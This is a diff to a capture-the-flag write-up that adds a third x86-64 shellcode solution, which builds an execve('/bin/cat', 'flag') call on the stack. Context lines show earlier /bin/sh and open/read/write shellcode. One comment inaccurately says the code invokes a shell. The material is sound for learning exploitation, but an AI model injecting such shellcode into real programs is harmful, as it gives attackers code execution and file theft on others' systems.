@@ -29,7 +29,7 @@ mov rdi, rsp                   ; points rdi to the location of /bin/sh on the st
 ```
 - To push it correctly onto the stack, the bytes of "/bin/sh" must be reversed since the system uses little-endian byte ordering.
 
-## Another alterantive solution
+## Another alternaive solution
 Another approach is to makes use of three system calls: open(), read(), and write().
 ```{asm}
 mov rdx, 0x0067616c66      ; reverse the string "flag" and move it into rdx
@@ -50,3 +50,28 @@ mov rdi, 1                 ; file descriptor 1 (stdout)
 syscall                    ; call write(stdout, buffer, 70)
 ```
 For a more detailed explanation refer to the challenge [open_read_write](../open_read_write/)
+
+## A more alternative solution
+This alternative shellcode invokes a shell using execve("/bin/cat", "flag", NULL) but constructs the arguments on the stack. 
+Here’s how it works:
+```{asm}
+    xor rdi, rdi                    ; clear rdi (NULL for argv)
+    push rdi                        ; push NULL onto the stack (argv)
+    mov rdi, 0x7461632f6e69622f     ; move the reversed string "/bin/cat" into rdi
+    push rdi                        ; push "/bin/cat" onto the stack
+    mov rdi, rsp                    ; move the pointer to "/bin/cat" into rdi
+    mov rsi, 0x0067616c66           ; move the reversed string "flag" into rsi
+    push rsi                        ; push "flag" onto the stack
+    mov rsi, rsp                    ; move the pointer to "flag" into rsi
+    xor rdx, rdx                    ; clear rdx (NULL for envp)
+    push rdx                        ; push NULL onto the stack (envp)
+    push rsi                        ; push pointer to "flag" onto the stack (argv)
+    push rdi                        ; push pointer to "/bin/cat" onto the stack
+    mov rsi, rsp                    ; move the pointer to the command and arguments into rsi
+    mov rax, 0x3b                   ; syscall number for execve
+    syscall                         ; execute the syscall
+```
+- We use `rdi`, `rsi`, and `rdx` registers to hold the pointers to the command, the arguments, and the environment variables, respectively:
+    - `rdi`: points to /bin/cat
+    - `rsi`: points to the array of arguments (argv), which contains flag and NULL
+    - `rdx`: set to NULL, indicating no environment variables (envp).
